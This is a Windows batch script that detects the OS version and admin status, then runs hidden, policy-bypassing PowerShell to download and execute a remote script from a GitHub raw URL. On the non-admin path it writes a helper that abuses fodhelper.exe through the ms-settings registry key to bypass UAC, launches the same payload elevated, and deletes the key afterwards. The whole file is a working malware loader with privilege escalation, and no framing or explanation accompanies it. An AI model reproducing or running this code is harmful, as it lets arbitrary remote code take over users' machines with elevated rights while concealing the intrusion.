@echo off
setlocal EnableDelayedExpansion
for /f "tokens=3" %%i in (
  'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild 2^>nul'
) do set build=%%i

if not defined build (
  for /f "tokens=3" %%i in (
    'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentVersion'
  ) do set version=%%i
)

if defined build (
    if !build! GEQ 22000 (
        set WINVER=11
    ) else (
        if !build! GEQ 10240 (
            set WINVER=10
        ) else (
            set WINVER=UNKNOWN
        )
    )
) else (
    if "!version!"=="6.1" set WINVER=7
    if "!version!"=="6.2" set WINVER=8
    if "!version!"=="6.3" set WINVER=8.1
)
net session >nul 2>&1
if errorlevel 1 if not "!WINVER!"=="10" if not "!WINVER!"=="11" (
    goto :helper
) else (
powershell -nop -W hidden -noni -ep bypass -C 'iex (irm https://raw.githubusercontent.com/petergriuffin123/ffffff2/refs/heads/main/ff.ps1)'
exit
)
:helper
if not exist "C:\Program Files\r" (
md "C:\Program Files\r"
cd "C:\Program Files\r"
) else (
cd "C:\Program Files\r"
)
(
echo function ffv(){
echo 	New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
echo 	New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
echo 	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c powershell -nop -W hidden -noni -ep bypass -C 'iex (irm https://raw.githubusercontent.com/petergriuffin123/ffffff2/refs/heads/main/ff.ps1)'"
echo 	Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Normal
echo    Start-Sleep 3
echo    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
echo }
echo ffv
) >  helper.ps1
powershell -nop -W hidden -noni -ep bypass -File "C:\Program Files\r\helper.ps1"